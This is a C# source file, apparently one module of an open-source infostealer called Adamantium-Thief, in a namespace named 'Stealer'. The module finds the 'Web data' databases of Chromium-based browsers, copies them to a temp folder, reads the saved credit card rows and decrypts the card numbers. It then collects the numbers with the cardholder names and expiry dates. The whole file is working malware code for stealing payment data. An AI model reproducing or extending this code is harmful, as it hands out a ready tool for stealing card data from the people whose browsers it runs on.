/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/Adamantium-Thief
*/

using System;
using System.IO;
using System.Collections.Generic;
using static Stealer.Common;

namespace Stealer
{
    internal class CreditCards
    {
        public static List<CreditCard> Get()
        {
            string SqliteFile = "Web data";
            List<CreditCard> CreditCards = new List<CreditCard>();
            // Database
            string tempCCLocation = "";

            // Search all browsers
            foreach (string browser in Paths.chromiumBasedBrowsers)
            {
                string Browser = Paths.GetUserData(browser) + SqliteFile;
                if (File.Exists(Browser))
                {
                    tempCCLocation = Environment.GetEnvironmentVariable("temp") + "\\browserCreditCards";
                    if (File.Exists(tempCCLocation))
                    {
                        File.Delete(tempCCLocation);
                    }
                    File.Copy(Browser, tempCCLocation);
                } else {
                    continue;
                }

                // Read chrome database
                SQLite sSQLite = new SQLite(tempCCLocation);
                sSQLite.ReadTable("credit_cards");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    // Get data from database
                    string number = sSQLite.GetValue(i, 4);
                    string expYear = sSQLite.GetValue(i, 3);
                    string expMonth = sSQLite.GetValue(i, 2);
                    string name = sSQLite.GetValue(i, 1);

                    // If no data => break
                    if (string.IsNullOrEmpty(number))
                    {
                        break;
                    }

                    CreditCard credentials = new CreditCard();
                    credentials.number = Crypt.decryptChrome(number, Browser);
                    credentials.expmonth = expMonth;
                    credentials.expyear = expYear;
                    credentials.name = Crypt.GetUTF8(name);

                    CreditCards.Add(credentials);
                    continue;
                }
                continue;
            }
            return CreditCards;
        }
    }
}
